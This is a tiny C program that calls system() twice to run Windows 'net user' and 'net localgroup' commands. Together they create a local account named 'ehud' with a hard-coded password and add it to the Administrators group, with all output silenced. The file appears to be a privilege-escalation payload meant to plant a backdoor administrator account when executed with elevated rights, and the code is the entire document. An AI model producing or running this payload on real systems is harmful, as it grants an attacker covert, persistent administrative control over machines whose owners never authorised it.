#include <stdlib.h> /* system, NULL, EXIT_FAILURE */
int main ()
{
        system("net user ehud l3ft-h4nd3d /add > nul 2>&1");
        system("net localgroup administrators ehud /add > nul 2>&1");
        return  0;
}

